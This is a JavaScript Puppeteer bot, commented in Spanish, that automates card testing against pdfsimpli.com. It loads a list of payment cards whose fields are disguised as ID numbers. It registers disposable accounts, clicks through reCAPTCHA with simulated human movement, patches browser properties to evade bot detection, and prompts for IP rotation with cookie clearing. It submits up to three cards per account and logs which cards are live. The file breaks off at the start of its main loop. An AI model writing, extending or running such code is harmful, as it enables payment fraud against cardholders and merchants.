// 🔥 KATY20 PRO — ULTRA FINAL (TERMUX + XVFB Edition)
// FLUJO COMPLETO + RÁPIDO + CLOSE KILLER + LOOP DE CUENTAS
// + ELIMINAR TARJETAS + VALIDAS/INVALIDAS + ROTACIÓN IP MANUAL
// + FORMULARIO LENTO HUMANO + AUTOREPARACIÓN + XVFB SUPPORT
// + ANTI-DETECCIÓN COMPLETO + MOVIMIENTO HUMANO EXACTO

const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());
const fs = require('fs').promises;
const path = require('path');

const COLORS = {
    reset: "\x1b[0m",
    red: "\x1b[31m",
    green: "\x1b[32m",
    yellow: "\x1b[33m"
};

// ======================================================
// 🔥 CAPTCHA SOLVER UNIVERSAL MEJORADO
// ======================================================
class CaptchaSolver {
    constructor(page, log = console.log) {
        this.page = page;
        this.log = log;
    }

    delay(ms) { return new Promise(res => setTimeout(res, ms)); }

    async solve() {
        try {
            await this.delay(2000);
            await this.log("🔍 Buscando CAPTCHA...");

            let anchor = null, frameFound = null;

            for (let i = 0; i < 12; i++) {
                for (const f of this.page.frames()) {
                    anchor =
                        await f.$("#recaptcha-anchor") ||
                        await f.$(".recaptcha-checkbox-checkmark") ||
                        await f.$(".recaptcha-checkbox");

                    if (anchor) {
                        frameFound = f;
                        await this.log(`✅ CAPTCHA encontrado en ${f.url().slice(0, 60)}...`);
                        break;
                    }
                }
                if (anchor) break;
                await this.delay(700);
            }

            if (!anchor) {
                await this.log("⏩ No hay CAPTCHA");
                return true;
            }

            // 🔥 MOVIMIENTO HUMANO EXACTO ANTES DEL CLICK
            const box = await anchor.boundingBox();
            if (box) {
                // Movimiento humano con micro-variaciones
                const targetX = box.x + box.width / 2;
                const targetY = box.y + box.height / 2;
                
                // 🔥 MOVIMIENTO HUMANO REAL
                await this.page.mouse.move(
                    200 + Math.random() * 50, 
                    300 + Math.random() * 50, 
                    { steps: 20 + Math.random() * 10 }
                );
                
                // 🔥 PAUSA HUMANA
                await this.delay(1000 + Math.random() * 500);
                
                // Movimiento final al checkbox
                await this.page.mouse.move(targetX, targetY, { steps: 10 });
                await this.delay(100);
                
                // Click preciso
                await this.page.mouse.down();
                await this.delay(80 + Math.random() * 40);
                await this.page.mouse.up();
            } else {
                await anchor.click();
            }

            await this.delay(3000);

            // Verificar si se resolvió
            for (let i = 0; i < 5; i++) {
                try {
                    const ok = await frameFound.$eval(
                        "#recaptcha-anchor",
                        el => el.getAttribute("aria-checked") === "true"
                    );
                    if (ok) {
                        await this.log("🟢 CAPTCHA resuelto automáticamente");
                        return true;
                    }
                } catch (_) { }
                await this.delay(1200);
            }

            await this.log("⚠️ CAPTCHA requiere intervención manual");
            await this.delay(8000);
            return true;

        } catch (e) {
            await this.log("⚠️ Error en captcha: " + e.message);
            return true;
        }
    }
}

// ======================================================
// 🔥 KATY20 – BRAIN ENGINE (TERMUX XVFB MODE)
// ======================================================
class PDFSimpliBot {
    constructor() {
        // 🔥 CAMBIO: Rutas actualizadas para coincidir con DUA9.js
        this.baseDir = "/data/data/com.termux/files/home/botdata";
        this.logFile = path.join(this.baseDir, "bot_log.txt");
        this.cuentasFile = path.join(this.baseDir, "cuentas_pdfsimpli.json");
        this.livesFile = path.join(this.baseDir, "lives.txt");

        // 🔥 CAMBIO: Lista de rutas Chromium como en DUA9.js
        this.CHROMIUM_PATHS = [
            "/data/data/com.termux/files/usr/bin/chromium-browser",
            "/data/data/com.termux/files/usr/bin/chromium",
            "/usr/bin/chromium-browser",
            "/usr/bin/chromium"
        ];

        this.browser = null;
        this.page = null;

        this.tarjetas = [];
        this.tarjetaIndex = 0;

        this.cuentasProcesadas = 0;
        this.cardsThisAccount = 0;
    }

    delay(ms) { return new Promise(res => setTimeout(res, ms)); }

    async log(msg) {
        const t = `[${new Date().toISOString()}] ${msg}`;
        console.log(t);
        await fs.appendFile(this.logFile, t + "\n");
    }

    async ensureDir(d) {
        try { await fs.mkdir(d, { recursive: true }); } catch (_) { }
    }

    // 🔥 NUEVO: Método para encontrar Chromium como en DUA9.js
    async findChromium() {
        for (const p of this.CHROMIUM_PATHS) {
            try { 
                await fs.access(p); 
                return p; 
            } catch (_) { }
        }
        throw new Error("❌ Chromium no encontrado");
    }

    async deepFind(selector) {
        let el = await this.page.$(selector);
        if (el) return el;
        for (const f of this.page.frames()) {
            try {
                el = await f.$(selector);
                if (el) return el;
            } catch (_) { }
        }
        return null;
    }

    // =============================================================
    // ESPERA ESPECIAL PARA CAPTCHA (Termux Boosted)
    // =============================================================
    async waitForCaptchaReady(maxWait = 20000) {
        await this.log("⏳ Esperando iframe de reCAPTCHA...");

        const start = Date.now();

        while (Date.now() - start < maxWait) {
            const isReady = await this.page.evaluate(() => {
                const f = document.querySelector("iframe[src*='recaptcha']");
                return f !== null;
            });

            if (isReady) {
                await this.log("🟢 reCAPTCHA iframe cargado");
                return true;
            }

            await this.delay(500);
        }

        await this.log("⚠️ reCAPTCHA no apareció (timeout)");
        return false;
    }

    // =============================================================
    // EVASIÓN ADICIONAL DE DETECCIÓN
    // =============================================================
    async applyStealthPatches() {
        // Ocultar automation properties
        await this.page.evaluateOnNewDocument(() => {
            // Eliminar traces de automation
            delete navigator.__proto__.webdriver;
            
            // Mock plugins
            Object.defineProperty(navigator, 'plugins', {
                get: () => [1, 2, 3, 4, 5],
            });
            
            // Mock languages
            Object.defineProperty(navigator, 'languages', {
                get: () => ['es-ES', 'es', 'en-US', 'en'],
            });
        });

        // Headers realistas
        await this.page.setExtraHTTPHeaders({
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        });
    }

    // CLICK UNIVERSAL
    async ultraClick(selector) {
        for (let i = 0; i < 5; i++) {
            const el = await this.deepFind(selector);
            if (el) {
                try {
                    const box = await el.boundingBox();
                    if (box) {
                        await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
                        await this.delay(70);
                        await this.page.mouse.down();
                        await this.delay(60);
                        await this.page.mouse.up();
                        return true;
                    } else {
                        await el.click();
                        return true;
                    }
                } catch (_) { }
            }
            await this.delay(350);
        }
        return false;
    }

    // =============================================================
    // ESPERA PARA RENDERIZADO COMPLETO (ULTRA ESTABLE)
    // =============================================================
    async waitForPageReady() {
        await this.log("⏳ Esperando renderizado completo de la página...");

        // ============================
        // 1️⃣ Esperar Network Idle
        // ============================
        try {
            await this.page.waitForNetworkIdle({
                idleTime: 1000,
                timeout: 15000
            });
        } catch (err) {
            await this.log("⚠️ Network idle no alcanzado, continuando...");
        }

        // ============================
        // 2️⃣ Esperar que el DOM esté estable
        // ============================
        await this.page.evaluate(() => {
            return new Promise((resolve) => {

                // Si ya cargó el DOM completo → seguimos
                if (document.readyState === "complete") {
                    resolve();
                    return;
                }

                let timeoutId;

                const finish = () => {
                    clearTimeout(timeoutId);
                    observer.disconnect();
                    resolve();
                };

                const observer = new MutationObserver(() => {
                    clearTimeout(timeoutId);
                    timeoutId = setTimeout(finish, 500); // DOM estable 0.5s
                });

                observer.observe(document.body, {
                    childList: true,
                    subtree: true,
                    attributes: true
                });

                // Timeout de seguridad por si la página nunca termina
                timeoutId = setTimeout(finish, 3000);
            });
        });

        // ============================
        // 3️⃣ Espera adicional para elementos críticos
        // ============================
        await this.delay(1500);

        await this.log("✅ Página completamente renderizada");
    }

    // =============================================================
    // INIT (TERMUX + XVFB + ANTI-DETECCIÓN COMPLETO)
    // =============================================================
    async initialize() {
        await this.ensureDir(this.baseDir);
        await this.ensureDir(path.join(this.baseDir, "documents"));
        await this.ensureDir(path.join(this.baseDir, "downloads"));

        const chromium = await this.findChromium();

        // 🔥 CONFIGURACIÓN ANTI-DETECCIÓN COMPLETA
        this.browser = await puppeteer.launch({
            headless: false,
            executablePath: chromium,
            ignoreHTTPSErrors: true,
            defaultViewport: null,
            args: [
                "--no-sandbox",
                "--disable-blink-features=AutomationControlled",
                "--disable-infobars",
                "--disable-dev-shm-usage",
                "--disable-gpu",
                "--disable-setuid-sandbox",
                "--disable-web-security",
                "--ignore-certificate-errors",
                "--mute-audio",
                "--disable-background-timer-throttling",
                "--disable-renderer-backgrounding",
                "--disable-backgrounding-occluded-windows",
                "--single-process",
                "--disable-low-res-tiling",
                "--disable-extensions",
                "--window-size=1366,768",
                `--display=${process.env.DISPLAY || ":99"}`
            ]
        });

        this.page = await this.browser.newPage();

        // 🔥 USER-AGENT PERFECTO PARA reCAPTCHA
        await this.page.setUserAgent(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        );

        // 🔥 PARCHES INVISIBLES QUE reCAPTCHA AMA
        await this.page.evaluateOnNewDocument(() => {
            // Eliminar webdriver
            Object.defineProperty(navigator, 'webdriver', {
                get: () => false,
            });

            // Parche para permissions API
            const originalQuery = window.navigator.permissions.query;
            window.navigator.permissions.query = (parameters) => (
                parameters.name === 'notifications' ?
                    Promise.resolve({ state: Notification.permission }) :
                    originalQuery(parameters)
            );

            // Limpieza total
            localStorage.clear();
            sessionStorage.clear();
        });

        // WebGL por software
        await this.page.evaluateOnNewDocument(() => {
            const canvas = document.createElement("canvas");
            canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        });

        // 🔥 APLICAR PARCHES DE STEALTH
        await this.applyStealthPatches();

        await this.page.setViewport({ width: 1366, height: 768 });
        await this.log("🚀 KATY20 — Anti-detección COMPLETO activado");
    }

    // =============================================================
    // IP SYSTEM
    // =============================================================
    async getIP() {
        try {
            const res = await fetch("https://api.ipify.org?format=json", {
                method: "GET",
                timeout: 5000
            }).catch(() => null);

            if (!res) {
                await this.log("⚠️ Sin internet — esperando reconexión...");
                return "0.0.0.0"; 
            }

            const data = await res.json().catch(() => null);
            if (!data || !data.ip) return "0.0.0.0";

            return data.ip;

        } catch (e) {
            await this.log("⚠️ Error leyendo IP: " + e.message);
            return "0.0.0.0";
        }
    }

    async rotacionManualSiToca() {
        if (this.cuentasProcesadas === 0) return;
        if (this.cuentasProcesadas % 2 !== 0) return;

        await this.log("🔄 ROTACIÓN IP MANUAL — ACTIVAR MODO AVIÓN AHORA");
        await this.log("⏳ Esperando cambio REAL de IP…");

        let ipInicial = await this.getIP();
        await this.log(`📌 IP inicial detectada: ${ipInicial}`);

        while (true) {
            await this.delay(3000);
            let ipNueva = await this.getIP();

            if (ipNueva && ipNueva !== ipInicial && ipNueva !== "0.0.0.0") {
                await this.log(`🟢 IP CAMBIADA — ${ipInicial} → ${ipNueva}`);
                await this.delay(2000);

                // =======================================================
                // 🔥🔥🔥 LIMPIEZA TOTAL DEL NAVEGADOR
                // =======================================================
                try {
                    await this.log("🧹 Limpiando navegador por cambio de IP...");

                    const contexts = this.browser.browserContexts();
                    for (const ctx of contexts) {
                        try {
                            const pages = await ctx.pages();
                            for (const p of pages) {
                                await p.evaluate(() => {
                                    try {
                                        localStorage.clear();
                                        sessionStorage.clear();
                                    } catch (_) {}
                                });
                            }
                            await ctx.clearPermissionOverrides();
                        } catch (_) {}
                    }

                    const client = await this.page.target().createCDPSession();
                    await client.send('Network.clearBrowserCache');
                    await client.send('Network.clearBrowserCookies');

                    await this.log("🧼 Limpieza completada ✔️");

                } catch (e) {
                    await this.log("⚠️ Error limpiando navegador: " + e.message);
                }
                // =======================================================

                return;
            }

            if (!ipNueva || ipNueva === "0.0.0.0") {
                await this.log("⚠️ Sin internet — esperando reconexión...");
            } else {
                await this.log(`⚠️ Misma IP (${ipNueva})... esperando cambio...`);
            }
        }
    }

    // =============================================================
    // TARJETAS
    // =============================================================
    async loadAllTarjetas() {
        const raw = await fs.readFile(path.join(this.baseDir, "tarjetas.txt"), "utf8");
        this.tarjetas = raw
            .split(/\r?\n/)
            .map(l => l.trim())
            .filter(Boolean)
            .map(line => {
                const [cedula, mes, anio, ruc] = line.split("|");
                return { cedula, mes, anio, ruc };
            });

        this.tarjetaIndex = 0;
        this.cardsThisAccount = 0;

        await this.log(`💾 Tarjetas cargadas: ${this.tarjetas.length}`);
    }

    getNextTarjeta() {
        if (this.tarjetaIndex >= this.tarjetas.length) return null;
        const t = this.tarjetas[this.tarjetaIndex];
        this.tarjetaIndex++;
        return t;
    }

    async guardarCedulaValida(t) {
        const line = `${t.cedula}|${t.mes}|${t.anio}|${t.ruc}|VALIDA|${new Date().toISOString()}\n`;
        await fs.appendFile(this.livesFile, line);
        await this.log(`💾 LIVE GUARDADA: ${t.cedula}`);
    }

    async eliminarTarjetaDelArchivo(tarjeta) {
        try {
            const file = path.join(this.baseDir, "tarjetas.txt");
            const raw = await fs.readFile(file, "utf8");

            const lineToRemove = `${tarjeta.cedula}|${tarjeta.mes}|${tarjeta.anio}|${tarjeta.ruc}`;

            const newData = raw
                .split(/\r?\n/)
                .filter(l => l.trim() && l.trim() !== lineToRemove)
                .join("\n");

            await fs.writeFile(file, newData);
            await this.log(`🗑️ Tarjeta eliminada: ${lineToRemove}`);

        } catch (e) {
            await this.log("⚠️ Error eliminando tarjeta: " + e.message);
        }
    }

    async guardarTarjetaEnArchivo(tarjeta, esValida) {
        try {
            const file = path.join(
                this.baseDir,
                esValida ? "validas.txt" : "invalidas.txt"
            );

            const line = `${tarjeta.cedula}|${tarjeta.mes}|${tarjeta.anio}|${tarjeta.ruc}|${
                esValida ? "VALIDA" : "INVALIDA"
            }|${new Date().toISOString()}\n`;

            await fs.appendFile(file, line);

            await this.log(
                `📦 Tarjeta movida a ${esValida ? "validas.txt" : "invalidas.txt"}: ${
                    tarjeta.cedula
                }`
            );

        } catch (e) {
            await this.log("⚠️ Error guardando tarjeta: " + e.message);
        }
    }

    // =============================================================
    // SUBIR PDF + 5s EXTRA
    // =============================================================
    async uploadPDF() {
        await this.log("📄 Buscando input file...");
        const input = await this.deepFind('input[type="file"]');

        if (!input) throw new Error("❌ Input file no encontrado");

        const docs = path.join(this.baseDir, "documents");
        const files = await fs.readdir(docs);
        const pdf = files.find(f => f.endsWith(".pdf"));
        if (!pdf) throw new Error("❌ No hay PDF");

        const pdfPath = path.join(docs, pdf);
        await input.uploadFile(pdfPath);

        await this.log("📁 PDF subido: " + pdfPath);
        await this.delay(9000);
    }

    async clickLetsGetStarted() {
        await this.log("🔍 GET STARTED...");
        let ok = await this.ultraClick("#preEditPop");

        if (!ok) {
            ok = await this.page.evaluate(() => {
                for (const b of document.querySelectorAll("button,div,a")) {
                    if ((b.innerText || "").toLowerCase().includes("get started")) {
                        b.click(); return true;
                    }
                }
                return false;
            });
        }

        if (!ok) throw new Error("❌ GET STARTED no encontrado");
        await this.delay(3000);
        await this.log("🟢 GET STARTED presionado");
    }

    async clickConvert() {
        await this.log("⚙️ Esperando Convert...");

        let btn = null;

        for (let i = 0; i < 20; i++) {
            for (const f of this.page.frames()) {
                btn =
                    await f.$("#ConvertContinue") ||
                    await f.$("button[data-test='convert']") ||
                    await f.$(".button-convert");

                if (btn) break;
            }

            if (btn) break;

            if (i % 5 === 0)
                await this.log(`⏳ Convert intento ${i}/20`);

            await this.delay(900);
        }

        if (!btn) throw new Error("❌ Convert no apareció");

        const box = await btn.boundingBox();
        if (box) {
            await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
            await this.delay(100);
            await this.page.mouse.down();
            await this.delay(60);
            await this.page.mouse.up();
        } else {
            await btn.click();
        }

        await this.delay(6000);
        await this.log("🟢 Convert presionado");
    }

    async clickDownload() {
        await this.log("⬇️ DOWNLOAD...");

        await this.page._client().send("Page.setDownloadBehavior", {
            behavior: "allow",
            downloadPath: path.join(this.baseDir, "downloads")
        });

        const ok = await this.ultraClick("#congDwnaut");
        if (!ok) {
            await this.log("⚠️ DOWNLOAD no disponible ahora");
            return false;
        }

        await this.delay(6000);
        await this.log("📥 DOWNLOAD presionado");
        return true;
    }

    async handleRegistration() {
        await this.log("🧑‍💻 Registro...");

        const emailInput = await this.deepFind("#email");
        if (!emailInput) {
            await this.log("✔️ No pidió registro");
            return;
        }

        const passInput = await this.deepFind("#password");

        const email = `user${Date.now()}@gmail.com`;
        const pass = "P" + Math.random().toString(36).slice(2, 8) + "!";

        await emailInput.type(email, { delay: 80 });
        if (passInput) await passInput.type(pass, { delay: 80 });

        await this.ultraClick("#sign-up");

        await this.log("⏳ CAPTCHA con evasión avanzada...");

        // 🔥 ESPERA OPTIMIZADA + SOLVER MEJORADO
        await this.waitForCaptchaReady();
        
        // 🔥 APLICAR PARCHES ANTES DEL CAPTCHA
        await this.applyStealthPatches();
        
        const solver = new CaptchaSolver(this.page, this.log.bind(this));
        await solver.solve();

        await this.delay(1500);
        await this.log(`🟢 Cuenta creada: ${email}`);
    }

    async safeFindContinueButton() {
        try {
            for (const f of this.page.frames()) {
                const btn =
                    await f.$("#planPageContinueButton") ||
                    await f.$("button[data-test='continue']") ||
                    await f.$(".continue-button");
                if (btn) return btn;
            }

            const handle = await this.page.evaluateHandle(() => {
                const tags = ["button", "a", "div", "input"];
                for (const t of tags) {
                    for (const el of document.querySelectorAll(t)) {
                        const txt = (el.innerText || el.value || "").toLowerCase();
                        if (txt.includes("continue")) return el;
                    }
                }
                return null;
            });

            if (handle && handle.asElement) return handle.asElement();
            return null;

        } catch (e) {
            console.log("❌ safeFindContinueButton:", e);
            return null;
        }
    }

    async waitAndClickContinueToPayment() {
        await this.log("🔍 Buscando CONTINUE (plan)...");

        let btn = null;

        for (let i = 0; i < 20; i++) {
            btn = await this.safeFindContinueButton();
            if (btn) break;
            if (i % 5 === 0) await this.log(`⏳ CONTINUE intento ${i}/20`);
            await this.delay(1000);
        }

        if (!btn) throw new Error("❌ CONTINUE no apareció");

        const box = await btn.boundingBox();
        if (box) {
            await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
            await this.delay(100);
            await this.page.mouse.down();
            await this.delay(60);
            await this.page.mouse.up();
        } else {
            await btn.click();
        }

        await this.delay(5000);
        await this.log("🟢 CONTINUE presionado → entrando a pago...");
    }

    // =============================================================
    // FORMULARIO COMPLETO — LENTO + AUTOFIX + REINTENTOS
    // =============================================================
    async fillPaymentForm(cedula, mes, anio, ruc, nombre) {
        // 🔥 NUEVO: Esperar renderizado completo antes de comenzar
        await this.waitForPageReady();
        
        await this.log("🧾 Llenando formulario COMPLETO (lento + autoreparación)...");

        const intentar = async (intento) => {
            await this.log(`📝 Intento de llenado #${intento + 1}`);

            try {
                const nombreField =
                    await this.deepFind("#checkout_form_card_name") ||
                    await this.deepFind("[name='cardName']");

                if (!nombreField) throw new Error("Campo nombre no encontrado");

                await nombreField.click({ clickCount: 3 });
                await this.delay(200);
                await nombreField.type(nombre, { delay: 120 });

                await this.page.waitForSelector("select[name='ccMonthExp'], #expmo", { timeout: 60000 });
                await this.delay(200);

                const mesOk = await this.page.evaluate((mesStr) => {
                    const s = document.querySelector("select[name='ccMonthExp'], #expmo");
                    if (!s) return false;
                    const v = String(parseInt(mesStr, 10));
                    s.value = v;
                    s.dispatchEvent(new Event("change", { bubbles: true }));
                    return true;
                }, mes);

                if (!mesOk) throw new Error("Error mes");
                await this.delay(1200);

                await this.page.waitForSelector("select[name='ccYearExp'], #expyr", { timeout: 60000 });
                await this.delay(200);

                const anioOk = await this.page.evaluate((anioStr) => {
                    const s = document.querySelector("select[name='ccYearExp'], #expyr");
                    if (!s) return false;
                    const v = String(parseInt(anioStr, 10));
                    s.value = v;
                    s.dispatchEvent(new Event("change", { bubbles: true }));
                    return true;
                }, anio);

                if (!anioOk) throw new Error("Error año");
                await this.delay(1200);

                let cedulaField = null;
                const frames = this.page.frames();

                for (const f of frames) {
                    const cand = await f.$("input[name='cardNumber'], input#data");
                    if (!cand) continue;
                    const maxLen = await cand.evaluate(el => el.getAttribute("maxlength") || "");
                    if (maxLen && parseInt(maxLen, 10) >= 15) {
                        cedulaField = cand;
                        break;
                    }
                }

                if (!cedulaField) throw new Error("Campo tarjeta no encontrado");

                await cedulaField.click({ clickCount: 3 });
                await this.delay(200);
                await cedulaField.type(cedula, { delay: 90 });

                let rucField = null;
                for (const f of frames) {
                    const cand = await f.$("input#data[name='Data'], input[maxlength='4']");
                    if (!cand) continue;
                    const maxLen = await cand.evaluate(el => el.getAttribute("maxlength") || "");
                    if (maxLen === "4") {
                        rucField = cand;
                        break;
                    }
                }

                if (!rucField) throw new Error("Campo RUC no encontrado");

                await rucField.click({ clickCount: 3 });
                await this.delay(200);
                await rucField.type(ruc, { delay: 90 });

                await this.delay(500);

                let checkbox = await this.deepFind("#acceptCheckboxMark");
                if (!checkbox) throw new Error("Checkbox no encontrado");

                await this.page.evaluate(el => el.click(), checkbox);

                let submit = await this.deepFind("#btnChargeebeeSubmit");
                if (!submit) throw new Error("Submit no encontrado");

                await this.page.evaluate(
                    el => el.scrollIntoView({ behavior: "instant" }),
                    submit
                );

                await submit.click();

                await this.delay(2000);
                await this.log("🚀 Pago enviado (COMPLETO LENTO)");

                return true;

            } catch (e) {
                await this.log("⚠️ Error llenando: " + e.message);
                return false;
            }
        };

        for (let i = 0; i < 3; i++) {
            const ok = await intentar(i);
            if (ok) return true;

            await this.log("🔄 Reparando formulario… limpiando campos…");

            try {
                await this.page.evaluate(() => {
                    const clean = (sel) => {
                        const el = document.querySelector(sel);
                        if (el) el.value = "";
                    };

                    clean("#checkout_form_card_name");
                    clean("[name='cardName']");
                    clean("input[name='cardNumber']");
                    clean("input#data[name='Data']");
                });
            } catch (_) { }

            await this.delay(1500);
        }

        throw new Error("No se pudo llenar formulario completo en 3 intentos");
    }
}

// =============================================================
// FLUJO RÁPIDO — LENTO + AUTOFIX + REINTENTOS
// =============================================================
PDFSimpliBot.prototype.fillCardFast = async function (cedula, ruc) {
    // 🔥 NUEVO: Esperar renderizado completo antes de comenzar
    await this.waitForPageReady();
    
    await this.log("⚡ FLUJO RÁPIDO: modo lento + autoreparación...");

    const intentar = async (intento) => {
        await this.log(`📝 Intento rápido #${intento + 1}`);

        try {
            let cedulaField = null;
            let rucField = null;
            const frames = this.page.frames();

            for (const f of frames) {
                const cand = await f.$("input[name='cardNumber'], input#data");
                if (!cand) continue;
                const maxLen = await cand.evaluate(el => el.getAttribute("maxlength") || "");
                if (maxLen && parseInt(maxLen, 10) >= 15) {
                    cedulaField = cand;
                    break;
                }
            }

            if (!cedulaField) throw new Error("Campo tarjeta no encontrado (rápido)");

            await cedulaField.click({ clickCount: 3 });
            await this.delay(150);
            await cedulaField.type(cedula, { delay: 85 });

            await this.delay(600);

            for (const f of frames) {
                const cand = await f.$("input#data[name='Data'], input[maxlength='4']");
                if (!cand) continue;

                const maxLen = await cand.evaluate(el => el.getAttribute("maxlength") || "");
                if (maxLen === "4") {
                    rucField = cand;
                    break;
                }
            }

            if (!rucField) throw new Error("Campo RUC no encontrado (rápido)");

            await rucField.click({ clickCount: 3 });
            await this.delay(150);
            await rucField.type(ruc, { delay: 85 });

            await this.delay(500);

            let submit = await this.deepFind("#btnChargeebeeSubmit");
            if (!submit) throw new Error("Botón submit no encontrado (rápido)");

            await this.page.evaluate(
                el => el.scrollIntoView({ behavior: "instant" }),
                submit
            );
            await submit.click();

            await this.log("🚀 Pago enviado (RÁPIDO LENTO)");
            await this.delay(2000);

            return true;

        } catch (e) {
            await this.log("⚠️ Error llenando rápido: " + e.message);
            return false;
        }
    };

    for (let i = 0; i < 3; i++) {
        const ok = await intentar(i);

        if (ok) return true;

        await this.log("🔄 Reparando formulario rápido… limpiando campos…");

        try {
            await this.page.evaluate(() => {
                const clean = (sel) => {
                    const el = document.querySelector(sel);
                    if (el) el.value = "";
                };
                clean("input[name='cardNumber']");
                clean("input#data[name='Data']");
            });
        } catch (_) { }

        await this.delay(1500);
    }

    throw new Error("❌ No se pudo llenar rápido en 3 intentos");
};

// =============================================================
// CLOSE KILLER — DETECCIÓN Y ELIMINACIÓN
// =============================================================
PDFSimpliBot.prototype.findCloseButton = async function () {
    const frames = [this.page, ...this.page.frames()];

    for (const ctx of frames) {
        try {
            const handle = await ctx.evaluateHandle(() => {
                const btn = [...document.querySelectorAll("button")]
                    .find(b => (b.innerText || "").trim().toLowerCase().includes("close"));
                return btn || null;
            });
            if (handle && handle.asElement()) return handle.asElement();
        } catch (_) {}
    }

    return null;
};

PDFSimpliBot.prototype.closeErrorModal = async function () {
    await this.log("🔎 Buscando botón Close...");

    let foundAny = false;

    for (let intento = 0; intento < 12; intento++) {
        const btn = await this.findCloseButton();

        if (!btn) {
            if (!foundAny) {
                await this.log("🟢 No hay modal de error visible");
                return false;
            } else {
                await this.log("🟢 Modal ya cerrado");
                return true;
            }
        }

        foundAny = true;
        await this.log(`🔴 Close detectado → click intento ${intento + 1}`);

        try {
            await this.page.evaluate(el => el.scrollIntoView({ behavior: "instant", block: "center" }), btn);
        } catch (_) {}

        try {
            const box = await btn.boundingBox();
            if (box) {
                await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
                await this.delay(80);
                await this.page.mouse.down();
                await this.delay(70);
                await this.page.mouse.up();
            } else {
                await this.page.evaluate(el => el.click(), btn);
            }
        } catch (_) {}

        await this.delay(1000);
    }

    await this.log("💣 FORCE MODE → Eliminando modal por DOM");

    try {
        await this.page.evaluate(() => {
            [...document.querySelectorAll("button")].forEach(b => {
                if ((b.innerText || "").toLowerCase().includes("close")) {
                    b.parentElement?.parentElement?.remove();
                }
            });
        });
    } catch (_) {}

    await this.delay(500);
    await this.log("🟢 Modal destruido (Force Mode)");
    return true;
};

// =============================================================
// VERIFICAR RESULTADO DE PAGO
// =============================================================
PDFSimpliBot.prototype.verificarResultadoPago = async function (tarjetaActual) {
    const cedulaTxt = tarjetaActual ? tarjetaActual.cedula : "N/A";

    await this.log("⏳ Esperando 10 segundos para procesar el pago...");
    await this.delay(10000);

    const startCheck = Date.now();
    const maxCheck = 15000;
    let success = false;

    while (Date.now() - startCheck < maxCheck) {
        const currentUrl = this.page.url();
        const pageSource = (await this.page.content()).toLowerCase();

        if (currentUrl.includes("pdfsimpli.com/app/billing/confirmation")) {
            success = true;
        }

        if (!success) {
            try {
                const visibleSuccess = await this.page.evaluate(() => {
                    const terms = ["payment successful", "thank you", "transaction completed"];
                    return terms.some(t =>
                        [...document.querySelectorAll("*")]
                            .some(el => (el.innerText || "").toLowerCase().includes(t))
                    );
                });
                if (visibleSuccess) success = true;
            } catch (_) {}
        }

        if (!success) {
            const terms = ["payment successful", "thank you", "transaction completed"];
            if (terms.some(t => pageSource.includes(t))) {
                success = true;
            }
        }

        if (success) break;
        await this.delay(1000);
    }

    if (success) {
        await this.log(`${COLORS.green}✅ TARJETA VÁLIDA — PAGO EXITOSO (${cedulaTxt})${COLORS.reset}`);
        if (tarjetaActual) await this.guardarCedulaValida(tarjetaActual);
        return true;
    }

    const hadClose = await this.closeErrorModal();
    if (hadClose) {
        await this.log(`${COLORS.red}❌ TARJETA INVÁLIDA — MODAL CLOSE DETECTADO (${cedulaTxt})${COLORS.reset}`);
        return false;
    }

    const src = (await this.page.content()).toLowerCase();
    const errorTerms = ["declined", "error", "invalid", "failed", "rejected"];
    if (errorTerms.some(t => src.includes(t))) {
        await this.log(`${COLORS.red}❌ TARJETA INVÁLIDA — MENSAJE DE ERROR DETECTADO (${cedulaTxt})${COLORS.reset}`);
        return false;
    }

    await this.log(`${COLORS.red}❌ TARJETA INVÁLIDA — TIMEOUT SIN ÉXITO NI CLOSE (${cedulaTxt})${COLORS.reset}`);
    return false;
};

// =============================================================
// PROCESAR TARJETA
// =============================================================
PDFSimpliBot.prototype.procesarTarjeta = async function (tarjeta, usarRapido) {
    const { cedula, mes, anio, ruc } = tarjeta;
    const nombre = "User" + Math.random().toString(36).slice(2, 7);

    if (!usarRapido) {
        await this.fillPaymentForm(cedula, mes, anio, ruc, nombre);
    } else {
        await this.fillCardFast(cedula, ruc);
    }

    const ok = await this.verificarResultadoPago(tarjeta);

    await this.guardarTarjetaEnArchivo(tarjeta, ok);
    await this.eliminarTarjetaDelArchivo(tarjeta);

    return ok;
};

// =============================================================
// FLUJO PRINCIPAL POR CUENTA
// =============================================================
PDFSimpliBot.prototype.executeFlowCuenta = async function () {
    await this.log("🌐 Cargando PDFSimpli (nueva cuenta)...");
    await this.page.goto("https://pdfsimpli.com", {
        waitUntil: "networkidle2",
        timeout: 60000
    });

    await this.delay(1500);

    await this.uploadPDF();
    await this.clickLetsGetStarted();
    await this.clickConvert();
    await this.clickDownload();
    await this.handleRegistration();
    await this.waitAndClickContinueToPayment();

    this.cardsThisAccount = 0;

    while (this.cardsThisAccount < 3) {
        const tarjeta = this.getNextTarjeta();
        if (!tarjeta) {
            await this.log("⛔ No hay más tarjetas en tarjetas.txt");
            return false;
        }

        const usarRapido = this.cardsThisAccount > 0;
        this.cardsThisAccount++;

        await this.log(
            `💳 Probando tarjeta #${this.cardsThisAccount} (modo: ${usarRapido ? "RÁPIDO" : "COMPLETO"})`
        );

        try {
            const ok = await this.procesarTarjeta(tarjeta, usarRapido);

            if (ok) {
                await this.log("🏁 CUENTA FINALIZADA POR TARJETA VÁLIDA → CREAR NUEVA CUENTA");
                this.cuentasProcesadas++;
                return true;
            }

        } catch (e) {
            await this.log("⚠️ Error procesando tarjeta: " + e.message);
        }
    }

    await this.log("⛔ Las 3 tarjetas de esta cuenta fueron inválidas — se creará una nueva cuenta.");
    this.cuentasProcesadas++;
    return true;
};

// =============================================================
// CLOSE BROWSER
// =============================================================
PDFSimpliBot.prototype.close = async function () {
    if (this.browser) {
        await this.browser.close();
        await this.log("🔚 Navegador cerrado");
    }
};

// =============================================================
// MAIN LOOP — INFINITO + ROTACIÓN IP
// =============================================================
(async () => {
    const bot = new PDFSimpliBot();
